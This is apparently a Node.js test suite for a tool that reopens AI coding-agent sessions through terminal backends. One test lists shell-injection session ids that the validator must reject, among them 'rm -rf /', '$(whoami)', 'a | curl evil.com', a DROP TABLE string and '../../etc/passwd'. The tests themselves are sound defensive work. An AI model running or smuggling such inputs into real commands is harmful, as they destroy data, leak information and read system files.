const test = require('node:test');
const assert = require('node:assert');

const { openSession, assertValidSession } = require('../src/backends');

const valid = {
  agent: 'claude',
  dir: 'C:\\DEV',
  sessionId: 'e05d7ab3-bf50-4d3c-b408-8c0f9164f268',
};

function stub(name, { available = true, fail = false } = {}) {
  const calls = [];
  return {
    name,
    calls,
    available: () => available,
    open: (session) => {
      calls.push(session);
      if (fail) throw new Error(`${name} quebrou`);
    },
  };
}

test('sessao valida passa na validacao', () => {
  assert.doesNotThrow(() => assertValidSession(valid));
});

test('ids com shell metacharacters sao rejeitados', () => {
  const perigosos = [
    'abc; rm -rf /',
    '$(whoami)',
    '`id`',
    'a | curl evil.com',
    'a && shutdown',
    "a'; DROP TABLE--",
    'a\nrm -rf /',
    '../../etc/passwd',
  ];

  perigosos.forEach((sessionId) => {
    assert.throws(
      () => assertValidSession({ dir: 'C:\\DEV', sessionId }),
      /Id de sessao invalido/,
      `deveria rejeitar: ${sessionId}`
    );
  });
});

test('id curto demais ou longo demais e rejeitado', () => {
  assert.throws(() => assertValidSession({ dir: 'C:\\DEV', sessionId: 'ab' }), /Id de sessao/);
  assert.throws(() => assertValidSession({ dir: 'C:\\DEV', sessionId: 'a'.repeat(65) }), /Id de sessao/);
});

test('diretorio vazio e rejeitado', () => {
  assert.throws(() => assertValidSession({ dir: '   ', sessionId: valid.sessionId }), /Diretorio/);
});

test('sessao nula e rejeitada', () => {
  assert.throws(() => assertValidSession(null), /Sessao invalida/);
});

test('usa o primeiro backend disponivel', () => {
  const primeiro = stub('primeiro');
  const segundo = stub('segundo');

  const result = openSession(valid, [primeiro, segundo]);
  assert.strictEqual(result.backend, 'primeiro');
  assert.strictEqual(segundo.calls.length, 0);
});

test('pula backend indisponivel', () => {
  const indisponivel = stub('indisponivel', { available: false });
  const disponivel = stub('disponivel');

  const result = openSession(valid, [indisponivel, disponivel]);
  assert.strictEqual(result.backend, 'disponivel');
  assert.strictEqual(indisponivel.calls.length, 0);
});

test('backend que falha cai pro proximo e reporta o erro', () => {
  const quebrado = stub('quebrado', { fail: true });
  const bom = stub('bom');

  const result = openSession(valid, [quebrado, bom]);
  assert.strictEqual(result.backend, 'bom');
  assert.strictEqual(result.failures.length, 1);
  assert.match(result.failures[0], /quebrado/);
});

test('available que lanca excecao nao derruba a cadeia', () => {
  const explosivo = {
    name: 'explosivo',
    available: () => {
      throw new Error('boom');
    },
    open: () => {},
  };
  const bom = stub('bom');

  const result = openSession(valid, [explosivo, bom]);
  assert.strictEqual(result.backend, 'bom');
});

test('todos falhando gera erro final', () => {
  const a = stub('a', { fail: true });
  const b = stub('b', { fail: true });

  assert.throws(() => openSession(valid, [a, b]), /Nenhum backend conseguiu abrir/);
});

test('backend real de fallback nunca quebra', () => {
  const fallback = require('../src/backends/fallback');
  assert.strictEqual(fallback.available(), true);
  assert.doesNotThrow(() => fallback.open(valid, ['claude', '-r', valid.sessionId]));
});

test('cada agente recebe seu proprio comando de resume', () => {
  const spy = stub('spy');

  const claude = openSession(valid, [spy]);
  assert.deepStrictEqual(claude.command, ['claude', '-r', valid.sessionId]);

  const codex = openSession({ agent: 'codex', dir: 'C:\\DEV', sessionId: '019eb695-3961-7310' }, [spy]);
  assert.deepStrictEqual(codex.command, ['codex', 'resume', '019eb695-3961-7310']);
});

test('agente desconhecido falha em vez de chutar um comando', () => {
  assert.throws(
    () => openSession({ agent: 'inexistente', dir: 'C:\\DEV', sessionId: 'abc12345' }, [stub('x')]),
    /Agente desconhecido/
  );
});

test('herdr fica indisponivel sem as variaveis de ambiente', () => {
  const herdr = require('../src/backends/herdr');
  const before = { env: process.env.HERDR_ENV, ws: process.env.HERDR_WORKSPACE_ID };

  delete process.env.HERDR_ENV;
  delete process.env.HERDR_WORKSPACE_ID;
  assert.strictEqual(herdr.available(), false);

  process.env.HERDR_ENV = '1';
  assert.strictEqual(herdr.available(), false, 'sem workspace id nao deve estar disponivel');

  if (before.env === undefined) delete process.env.HERDR_ENV;
  else process.env.HERDR_ENV = before.env;
  if (before.ws === undefined) delete process.env.HERDR_WORKSPACE_ID;
  else process.env.HERDR_WORKSPACE_ID = before.ws;
});

test('tmux fica indisponivel fora de sessao tmux', () => {
  const tmux = require('../src/backends/tmux');
  const before = process.env.TMUX;
  delete process.env.TMUX;
  assert.strictEqual(tmux.available(), false);
  if (before !== undefined) process.env.TMUX = before;
});

test('console classico do Windows so entra sem Windows Terminal', () => {
  const win = require('../src/backends/windowsConsole');
  const before = { plat: process.platform, wt: process.env.WT_SESSION };

  Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });

  process.env.WT_SESSION = 'abc';
  assert.strictEqual(win.available(), false, 'com WT ativo, quem abre aba tem prioridade');

  delete process.env.WT_SESSION;
  assert.strictEqual(win.available(), true, 'sem WT, abre janela nova');

  Object.defineProperty(process, 'platform', { value: 'linux', configurable: true });
  assert.strictEqual(win.available(), false, 'nao existe fora do Windows');

  Object.defineProperty(process, 'platform', { value: before.plat, configurable: true });
  if (before.wt !== undefined) process.env.WT_SESSION = before.wt;
});

test('a cadeia prefere aba a janela, e janela a imprimir comando', () => {
  const { BACKENDS } = require('../src/backends');
  const ordem = BACKENDS.map((b) => b.name);

  assert.ok(ordem.indexOf('windows-terminal') < ordem.indexOf('windows-console'), 'aba antes de janela');
  assert.ok(ordem.indexOf('windows-console') < ordem.indexOf('fallback'), 'janela antes do fallback');
  assert.strictEqual(ordem[ordem.length - 1], 'fallback', 'fallback e sempre o ultimo');
});

test('wt.exe recebe -w antes do subcomando new-tab', (t) => {
  const cp = require('child_process');
  const spawnMock = t.mock.method(cp, 'spawn', () => ({ unref: () => {} }));

  delete require.cache[require.resolve('../src/backends/windowsTerminal')];
  const windowsTerminal = require('../src/backends/windowsTerminal');

  windowsTerminal.open(
    { dir: 'C:\DEV' },
    ['claude', '-r', 'e05d7ab3-bf50-4d3c-b408-8c0f9164f268']
  );

  assert.strictEqual(spawnMock.mock.calls.length, 1);
  const [bin, args] = spawnMock.mock.calls[0].arguments;

  assert.strictEqual(bin, 'wt.exe');
  const iw = args.indexOf('-w');
  const iNewTab = args.indexOf('new-tab');

  assert.notStrictEqual(iw, -1, 'wt.exe precisa da flag -w');
  assert.notStrictEqual(iNewTab, -1, 'wt.exe precisa do subcomando new-tab');
  assert.ok(
    iw < iNewTab,
    '-w e opcao global do wt.exe: depois de new-tab ele vira argumento solto do subcomando e a janela nunca abre'
  );
});
